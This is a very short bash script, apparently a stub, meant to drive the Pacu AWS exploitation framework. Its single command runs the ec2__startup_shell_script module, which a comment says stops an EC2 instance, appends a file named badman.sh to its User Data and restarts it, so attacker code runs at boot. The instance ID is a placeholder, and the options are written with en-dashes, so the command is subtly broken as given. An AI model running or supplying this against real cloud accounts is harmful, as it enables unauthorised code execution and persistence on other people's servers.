#!/bin/bash
# TODO: start pacu

# This will stop the instance, copy the User Data, add the contents from badman.sh, then start the instance again.
exec ec2__startup_shell_script –script badman.sh –instance-ids xxx
